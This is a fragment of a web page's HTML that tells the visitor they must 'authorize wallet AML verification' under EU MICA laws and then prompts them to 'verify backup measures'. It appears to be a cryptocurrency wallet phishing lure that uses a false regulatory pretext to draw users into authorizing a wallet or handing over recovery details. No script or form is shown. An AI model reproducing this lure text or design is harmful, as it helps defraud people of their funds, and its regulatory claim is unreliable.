  ...
  <body>
    <div>
      ...
      >
       ...
       <div class="mt-14 text-center text-white border m-12 px-8 py-4 rounded-lg border-[#575757] max-w-lg">
        <h2 class="text-2xl font-semibold ">You have been requested to authorize wallet AML verification </h2>
        <h5 class="leading-7 [&:not(:first-child)]:mt-6 text-[#8C8C8C]">European Union MICA laws need us to verify the security of your wallet and perform anti-money laundering checks</h5>
       ...
       <div class="flex mt-8 align-middle justify-center items-center space-x-8">
        <span class="material-symbols-outlined">
          ...
          <div class="flex flex-col items-center justify-center align-middle text-center">
            <h3>Verify backup measures</h3>
            <h5 class="text-left text-sm text-[#8C8C8C]">Ensure you are able to recover in an unfortunate scenario</h5>
          </div>
